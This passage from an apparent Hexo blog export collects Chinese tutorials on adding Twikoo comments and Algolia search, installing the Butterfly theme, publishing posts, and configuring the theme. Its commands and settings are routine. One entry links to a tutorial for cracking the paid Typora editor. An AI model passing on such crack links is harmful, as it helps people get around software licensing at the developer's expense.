href="#前端部署" class="headerlink" title="前端部署"></a>前端部署</h2><p>修改主题配置文件_config.butterfly.yml，搜索twikoo，你只需要把获取到Vercel的环境 ID (envId) 填写到配置上去就行，其他不改：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">twikoo:</span><br><span class="line">  envId:</span><br><span class="line">  region:</span><br><span class="line">  visitor: false</span><br><span class="line">  option:</span><br></pre></td></tr></table></figure><p>然后搜索comments，设置评论应用为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">comments:</span><br><span class="line">  use: twikoo</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">注意：最新评论只会在刷新时才会去读取，并不会实时变化</span><br><span class="line">由于 API 有 访问次数限制，为了避免调用太多，主题默认存取期限为 10 分鐘。也就是説，调用后资料会存在 localStorage 里，10 分鐘内刷新网站只会去 localStorage 读取资料。 10 分鐘期限一过，刷新页面时才会去调取 API 读取新的数据。（ 3.6.0 新增了 storage 配置，可自行配置缓存时间）</span><br></pre></td></tr></table></figure><p>在侧边栏显示最新评论板块</p><p>修改主题配置文件 <code>_config.butterfly.yml</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Aside widget - Newest Comments</span><br><span class="line">newest_comments:</span><br><span class="line">  enable: true</span><br><span class="line">  sort_order: # Don&#x27;t modify the setting unless you know how it works</span><br><span class="line">  limit: 6</span><br><span class="line">  storage: 10 # unit: mins, save data to localStorage</span><br><span class="line">  avatar: true</span><br></pre></td></tr></table></figure><h2 id="登录Twikoo管理面板："><a href="#登录Twikoo管理面板：" class="headerlink" title="登录Twikoo管理面板："></a>登录Twikoo管理面板：</h2><p>先把刚刚的所有修改保存并部署到本地</p><p>打开网站随便一篇文章翻到页面底部，点击设置并注册管理员密码</p><p><img src="https://s1.ax1x.com/2023/04/26/p9KUksH.png" alt=""></p><p>评论设置完毕，测试一下吧~</p><p><img src="https://s1.ax1x.com/2023/04/26/p9KUCRO.png" alt="测试成功"></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 插件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客插件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo集成Algolia实现网站搜索引擎</title>
      <link href="/post/fe591630.html"/>
      <url>/post/fe591630.html</url>
      
        <content type="html"><![CDATA[<h2 id="创建-Alogolia-Index"><a href="#创建-Alogolia-Index" class="headerlink" title="创建 Alogolia Index"></a>创建 Alogolia Index</h2><p>首先登陆进入 <a href="https://www.algolia.com/users/sign_in">Algolia 官网</a>，我们可以使用 GitHub 或 Google 帐号登录。</p><p><img src="https://s1.ax1x.com/2023/04/25/p9n5A4U.png" alt=""></p><p>创建一个Index，随便取一个名字</p><p><img src="https://s1.ax1x.com/2023/04/25/p9n5CBq.png" alt=""></p><p>配置API Key</p><p>接下来我们需要配置 Algolia——API Keys 到我们自己的 hexo 站点中，关联两者，使得 Algolia 能够搜集我们 hexo 站点的数据通过 API 发送给 Aloglia</p><p>回到首页打开API Keys，其中的 <code>Application ID</code> 、<code>Search-Only API Key</code>、<code>Admin API KEY</code>信息将会被用到</p><p><img src="https://s1.ax1x.com/2023/04/25/p9n5FEV.png" alt=""></p><p><img src="https://s1.ax1x.com/2023/04/25/p9n5PH0.png" alt=""></p><p>首先我们需要修改Blog根目录下的 _config.yml：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">algolia:</span><br><span class="line">  applicationID: &#x27;你的Applicaiton ID&#x27;</span><br><span class="line">  apiKey: &#x27;你的Search-Only API Key&#x27;</span><br><span class="line">  indexName: &#x27;创建的索引名称&#x27;</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/04/25/p9n5kNT.png" alt="只用写上面给的三行即可"></p><p>然后我们需要配置一个名称为 <code>HEXO_ALGOLIA_INDEXING_KEY</code>，内容为 Alogolia 网页中 <code>Admin API KEY</code> 的环境变量，在Blog根目录下进行Git Bash并输入下列命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> HEXO_ALGOLIA_INDEXING_KEY=你的Admin API KEY</span><br></pre></td></tr></table></figure><h2 id="通过-Hexo-Aloglia-获取站点数据"><a href="#通过-Hexo-Aloglia-获取站点数据" class="headerlink" title="通过 Hexo Aloglia 获取站点数据"></a>通过 Hexo Aloglia 获取站点数据</h2><p>前面我们创建了 Index，但是此时为空，不包含任何数据。我们需要安装 <code>Hexo Aloglia</code> 扩展，这个扩展的功能是搜集站点的内容并通过 API 发送给 Aloglia</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install --save hexo-algolia</span><br></pre></td></tr></table></figure><p>安装完成后，在 hexo 站点根目录下执行下列命令来搜集数据更新到我们刚创建的 Index 中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo algolia</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/04/25/p9n5VCF.png" alt=""></p><p>如上图所示则代表成功将 hexo 站点中的数据发送到了 Alogolia 的 Index 中，我们可以在网页中看到所有的数据</p><h2 id="主题集成Algolia："><a href="#主题集成Algolia：" class="headerlink" title="主题集成Algolia："></a>主题集成Algolia：</h2><p>更改<strong>主题配置文件</strong>的_config.yml(注意是主题配置文件的_config.yml，我的是Blog/themes/butterfly目录下的，不是Blog根目录的_config.yml)，找到 Algolia Search 配置部分(文件当中有，直接搜索)，将<code>enable</code> 改为<code>true</code> 即可：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Algolia search</span><br><span class="line">algolia_search:</span><br><span class="line">  enable: true</span><br><span class="line">  hits:</span><br><span class="line">    per_page: 6</span><br></pre></td></tr></table></figure><p><img src="https://s1.ax1x.com/2023/04/25/p9n555T.png" alt=""></p><h2 id="修改搜索目录"><a href="#修改搜索目录" class="headerlink" title="修改搜索目录"></a>修改搜索目录</h2><p>之前一直没改站点URL，昨晚折腾到一点过也没搞好，今早遇到大佬指点才解决</p><p>如果你能搜索到对应文章但是点击搜索记录却是这样的页面</p><p><img src="https://s1.ax1x.com/2023/04/25/p9nvoid.png" alt=""></p><p>那应该是你的站点URL没有修改，打开Blog根目录下的_config.yml，将Url里面的网址修改为你的域名</p><p><img src="https://s1.ax1x.com/2023/04/25/p9nxCzq.png" alt=""></p><h2 id="重新部署"><a href="#重新部署" class="headerlink" title="重新部署"></a>重新部署</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure><h2 id="注意：每次对网站内容修改以后都需要更新Algolia"><a href="#注意：每次对网站内容修改以后都需要更新Algolia" class="headerlink" title="注意：每次对网站内容修改以后都需要更新Algolia"></a>注意：每次对网站内容修改以后都需要更新Algolia</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo algolia</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 插件 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo博客安装butterfly主题</title>
      <link href="/post/8f1335fc.html"/>
      <url>/post/8f1335fc.html</url>
      
        <content type="html"><![CDATA[<h2 id="Butterfly-主题安装"><a href="#Butterfly-主题安装" class="headerlink" title="Butterfly 主题安装"></a>Butterfly 主题安装</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure><p>这里面如果报错，如下图所示</p><p><img src="https://static001.geekbang.org/infoq/4b/4bd9fe08801a3332cf5552216b631149.png" alt=""></p><p>执行下列命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.proxy </span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br></pre></td></tr></table></figure><h2 id="应用主题"><a href="#应用主题" class="headerlink" title="应用主题"></a>应用主题</h2><p>Blog根目录下找到站点配置文件<code>_config.yml</code>文件</p><p>搜索找到<code>theme</code>，将<code>landscape</code>改为<code>butterfly</code></p><p><img src="https://static001.geekbang.org/infoq/b0/b08a6de31ecdfcc74ccb0037f23094b3.png" alt=""></p><h2 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h2><p>如果你没有 pug 以及 stylus 的渲染器，请下载安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 美化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客美化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客撰写与发布</title>
      <link href="/post/c2ec21ed.html"/>
      <url>/post/c2ec21ed.html</url>
      
        <content type="html"><![CDATA[<h2 id="Typora下载与配置"><a href="#Typora下载与配置" class="headerlink" title="Typora下载与配置"></a>Typora下载与配置</h2><p>下载与破解教程：<a href="https://www.cnblogs.com/guoxuanhan/p/16841068.html">2022最新Typora破解激活教程)</a></p><h2 id="文件夹介绍"><a href="#文件夹介绍" class="headerlink" title="文件夹介绍"></a>文件夹介绍</h2><ul><li><code>_config.yml</code>：俗称站点配置文件，很多与博客网站的格式、内容相关的设置都需要在里面改。</li><li><code>node_modules</code>:存储Hexo插件的文件，可以实现各种扩展功能。一般不需要管。</li><li><code>scaffolds</code>：模板文件夹，里面的<code>post.md</code>文件可以设置每一篇博客的模板。具体用起来就知道能干嘛了。</li><li><code>source</code>：非常重要。所有的个人文件都在里面！</li><li><code>themes</code>：主题文件夹，可以从<a href="https://hexo.io/themes/">Hexo主题官网</a>或者网上大神的Github主页下载各种各样美观的主题，让自己的网站变得逼格高端的关键！</li></ul><p><img src="https://static001.geekbang.org/infoq/3f/3f7b8b410726691082019f2ab603976b.png" alt=""></p><h2 id="生成新文章"><a href="#生成新文章" class="headerlink" title="生成新文章"></a>生成新文章</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new post <span class="string">&quot;新建博客文章名&quot;</span></span><br></pre></td></tr></table></figure><h2 id="文章标题与封面"><a href="#文章标题与封面" class="headerlink" title="文章标题与封面"></a>文章标题与封面</h2><ul><li><code>title</code>：文章标题</li><li><code>cover</code>：文章封面</li><li><code>categories</code>：文章分类</li><li><code>tags</code>：文章标签</li></ul><p><img src="https://s1.ax1x.com/2023/04/25/p9uidUK.png" alt=""></p><h2 id="发布博客"><a href="#发布博客" class="headerlink" title="发布博客"></a>发布博客</h2><ol><li>清理静态缓存</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo cl</span><br></pre></td></tr></table></figure><ol><li>生成</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo g</span><br></pre></td></tr></table></figure><ol><li>本地部署</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s</span><br></pre></td></tr></table></figure><p>​    部署以后打开一个浏览器，在网址栏输入localhost:4000/即可看到网站更新</p><ol><li>部署到Github</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d</span><br></pre></td></tr></table></figure><p>部署经常失败请参考：<a href="https://www.dqywy.top/post/b74bb192.html">博客部署到github失败</a></p>]]></content>
      
      
      <categories>
          
          <category> 博客 </category>
          
          <category> 搭建 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>butterfly主题的基础通用配置</title>
      <link href="/post/227e574e.html"/>
      <url>/post/227e574e.html</url>
      
        <content type="html"><![CDATA[<h2 id="循环动态显示文字"><a href="#循环动态显示文字" class="headerlink" title="循环动态显示文字"></a>循环动态显示文字</h2><p>可设置主页中展示的网站副标题或者自己喜欢的座右铭</p><p>修改主题配置文件<code>_config.butterfly.yml</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Site</span></span><br><span class="line"><span class="attr">title:</span> <span class="string">Hexo</span></span><br><span class="line"><span class="attr">subtitle:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># Typewriter Effect (打字效果)</span></span><br><span class="line">  <span class="attr">effect:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># loop (循環打字)</span></span><br><span class="line">  <span class="attr">loop:</span> <span class="literal">true</span></span><br><span class="line">  <span class="comment"># source 調用第三方服務</span></span><br><span class="line">  <span class="comment"># source: false 關閉調用</span></span><br><span class="line">  <span class="comment"># source: 1  調用一言網的一句話（簡體） https://hitokoto.cn/</span></span><br><span class="line">  <span class="comment"># source: 2  調用一句網（簡體） http://yijuzhan.com/</span></span><br><span class="line">  <span class="comment"># source: 3  調用今日詩詞（簡體） https://www.jinrishici.com/</span></span><br><span class="line">  <span class="comment"># subtitle 會先顯示 source , 再顯示 sub 的內容</span></span><br><span class="line">  <span class="comment"># source: 3</span></span><br><span class="line">  <span class="comment"># 如果關閉打字效果，subtitle 只會顯示 sub 的第一行文字</span></span><br><span class="line">  <span class="attr">sub:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">我双手合十的愿望里永远有你。</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">穿越人海，只为与你相拥。</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">手握日月摘</span> <span class="string">♥</span> <span class="string">悦。</span></span><br></pre></td></tr></table></figure><h2 id="侧边栏设置"><a href="#侧边栏设置" class="headerlink" title="侧边栏设置"></a>侧边栏设置</h2><p>修改主题配置文件<code>_config.butterfly.yml</code>，搜索<code>aside</code></p><p>带有card_前缀的是显示在网页右边的那一竖列的内容</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># aside (側邊欄)</span></span><br><span class="line"><span class="comment"># --------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="attr">aside:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">hide:</span> <span class="literal">false</span></span><br><span class="line">  <span class="attr">button:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">mobile:</span> <span class="literal">true</span> <span class="comment"># display on mobile</span></span><br><span class="line">  <span class="attr">position:</span> <span class="string">right</span> <span class="comment"># left or right</span></span><br><span class="line">  <span class="attr">display:</span></span><br><span class="line">    <span class="attr">archive:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">tag:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">category:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">card_author:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">description:</span></span><br><span class="line">    <span class="attr">button:</span></span><br><span class="line">      <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">      <span class="attr">icon:</span> <span class="string">fab</span> <span class="string">fa-github</span></span><br><span class="line">      <span class="attr">text:</span> <span class="string">Follow</span> <span class="string">Me</span></span><br><span class="line">      <span class="attr">link:</span> <span class="string">https://github.com/hellodqy</span></span><br><span class="line">  <span class="attr">card_announcement:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">content:</span> <span class="string">DQY</span> <span class="string">&amp;</span> <span class="string">WY</span></span><br><span class="line">  <span class="attr">card_recent_post:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">5</span> <span class="comment"># if set 0 will show all</span></span><br><span class="line">    <span class="attr">sort:</span> <span class="string">date</span> <span class="comment"># date or updated</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">card_categories:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">8</span> <span class="comment"># if set 0 will show all</span></span><br><span class="line">    <span class="attr">expand:</span> <span class="string">none</span> <span class="comment"># none/true/false</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">card_tags:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">40</span> <span class="comment"># if set 0 will show all</span></span><br><span class="line">    <span class="attr">color:</span> <span class="literal">false</span></span><br><span class="line">    <span class="attr">orderby:</span> <span class="string">random</span> <span class="comment"># Order of tags, random/name/length</span></span><br><span class="line">    <span class="attr">order:</span> <span class="number">1</span> <span class="comment"># Sort of order. 1, asc for ascending; -1, desc for descending</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">card_archives:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">monthly</span> <span class="comment"># yearly or monthly</span></span><br><span class="line">    <span class="attr">format:</span> <span class="string">MMMM</span> <span class="string">YYYY</span> <span class="comment"># eg: YYYY年MM月</span></span><br><span class="line">    <span class="attr">order:</span> <span class="number">-1</span> <span class="comment"># Sort of order. 1, asc for ascending; -1, desc for descending</span></span><br><span class="line">    <span class="attr">limit:</span> <span class="number">8</span> <span class="comment"># if set 0 will show all</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br><span class="line">  <span class="attr">card_webinfo:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">post_count:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">last_push_date:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">sort_order:</span> <span class="comment"># Don&#x27;t modify the setting unless you know how it works</span></span><br></pre></td></tr></table></figure><h2 id="首页文章数目"><a href="#首页文章数目" class="headerlink" title="首页文章数目"></a>首页文章数目</h2><p>首页显示的文章数目在Blog根目录下的系统配置文件修改，打开<code>_config.yml</code>搜索<code>index_generator</code></p><p><code>per_page</code>可以修改显示的文章数目</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Home page setting</span></span><br><span class="line"><span class="comment"># path: Root path for your blogs index page. (default = &#x27;&#x27;)</span></span><br><span class="line"><span class="comment"># per_page: Posts displayed per page. (0 = disable pagination)</span></span><br><span class="line"><span class="comment"># order_by: Posts order. (Order by date descending by default)</span></span><br><span class="line"><span class="attr">index_generator:</span></span><br><span class="line">  <span class="attr">path:</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="attr">per_page:</span> <span class="number">5</span></span><br><span class="line">  <span class="attr">order_by:</span> <span class="string">-date</span></span><br></pre></td></tr></table></figure><h2 id="访问人数"><a href="#访问人数" class="headerlink" title="访问人数"></a>访问人数</h2><p>修改主题配置文件<code>_config.butterfly.yml</code>，搜索<code>busuanzi</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">busuanzi:</span></span><br><span class="line">  <span class="attr">site_uv:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">site_pv:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">page_pv:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="运行时间"><a href="#运行时间" class="headerlink" title="运行时间"></a>运行时间</h2><p>修改主题配置文件<code>_config.butterfly.yml</code>，搜索<code>runtimeshow</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">runtimeshow:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">publish_date:</span> <span class="number">6</span><span class="string">/7/2018</span> <span class="number">00</span><span class="string">:00:00</span>  </span><br><span class="line">  <span class="comment">##网页开通时间</span></span><br><span class="line">  <span class="comment">#格式: 月/日/年 时间</span></span><br><span class="line">  <span class="comment">#也可以写成 年/月/日 时间</span></span><br></pre></td></tr></table></figure><h2 id="字数统计"><a href="#字数统计" class="headerlink" title="字数统计"></a>字数统计</h2><p>进入Blog根目录并执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-wordcount —save or yarn add hexo-wordcount</span><br></pre></td></tr></table></figure><p>修改主题配置文件<code>_config.butterfly.yml</code>，搜索<code>wordcount</code></p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">wordcount:</span></span><br><span class="line">  <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">post_wordcount:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">min2read:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">total_wordcount:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><h2 id="导航菜单"><a href="#导航菜单" class="headerlink" title="导航菜单"></a>导航菜单</h2><p>修改主题配置文件<code>_config.butterfly.yml</code>，去掉前面的井号就是启用该选项</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">menu:</span></span><br><span class="line">  <span class="string">首页:</span> <span class="string">/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-home</span></span><br><span class="line">  <span class="string">归档:</span> <span class="string">/archives/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-archive</span></span><br><span class="line">  <span class="string">摸鱼||fas</span> <span class="attr">fa-fish:</span></span><br><span class="line">    <span class="string">游戏:</span> <span class="string">/moyu/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-gamepad</span></span><br><span class="line">    <span class="string">工具:</span> <span class="string">/tools/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-tools</span></span><br><span class="line">  <span class="string">蓝桥:</span> <span class="string">/lanqiao/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-folder-open</span></span><br><span class="line">  <span class="string">标签:</span> <span class="string">/tags/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-tags</span></span><br><span class="line">  <span class="comment"># 分类: /categories/ ||</span></span><br><span class="line">  <span class="comment"># List||fas fa-list:</span></span><br><span class="line">  <span class="comment">#   Music: /music/ || fas fa-music</span></span><br><span class="line">  <span class="comment">#   Movie: /movies/ || fas fa-video</span></span><br><span class="line">  <span class="string">友人帐:</span> <span class="string">/link/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-link</span></span><br><span class="line">  <span class="string">关于我:</span> <span class="string">/about/</span> <span class="string">||</span> <span class="string">fas</span> <span class="string">fa-heart</span></span><br></pre></td></tr></table></figure><h2 id="关键页面生成"><a href="#关键页面生成" class="headerlink" title="关键页面生成"></a>关键页面生成</h2><p>博客有一些关键页面需要手动生成。</p><h3 id="标签页"><a href="#标签页" class="headerlink" title="标签页"></a>标签页</h3><p>进入Blog根目录cmd执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page tags</span><br></pre></td></tr></table></figure><p>打开 <code>source/tags/index.md</code> 文件，修改如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 标签</span><br><span class="line">date: 2022-03-11 12:53:45</span><br><span class="line">type: &quot;tags&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h3 id="分类页"><a href="#分类页" class="headerlink" title="分类页"></a>分类页</h3><p>进入Blog根目录cmd执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page categories</span><br></pre></td></tr></table></figure><p>打开source/categories/index.md文件，修改如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: 分类</span><br><span class="line">date: 2022-03-11 12:56:06</span><br><span class="line">type: &quot;categories&quot;</span><br><span class="line">---</span><br></pre></td></tr></table></figure><h2 id="背景图片参考"><a href="#背景图片参考" class="headerlink" title="背景图片参考"></a>背景图片参考</h2><ol><li><a href="https://wallhaven.cc/">https://wallhaven.cc/</a></li><li><a href="https://wall.alphacoders.com/">https://wall.alphacoders.com/</a></li><li><a href="https://bz.zzzmh.cn/index">https://bz.zzzmh.cn/index</a></li></ol><p>网站美化：<a href="http://haiyong.site/post/22e1d5da.html">http://haiyong.site/post/22e1d5da.html</a></p><h2 id="背景图设置"><a href="#背景图设置" class="headerlink" title="背景图设置"></a>背景图设置</h2><h3 id="顶部图"><a href="#顶部图" class="headerlink" title="顶部图"></a>顶部图</h3><div class="table-container"><table><thead><tr><th>配置</th><th>含义</th></tr></thead><tbody><tr><td>index_img</td><td>主页的 top_img</td></tr><tr><td>default_top_img</td><td>默认的 top_img，当页面的 top_img 没有配置时，会显示 default_top_img</td></tr><tr><td>archive_img</td><td>归档页面的 top_img</td></tr><tr><td>tag_img</td><td>tag 子页面 的 默认 top_img</td></tr><tr><td>tag_per_img</td><td>tag 子页面的 top_img，可配置每个 tag 的 top_img</td></tr><tr><td>category_img</td><td>category 子页面 的 默认 top_img</td></tr><tr><td>category_per_img</td><td>category 子页面的 top_img，可配置每个 category 的 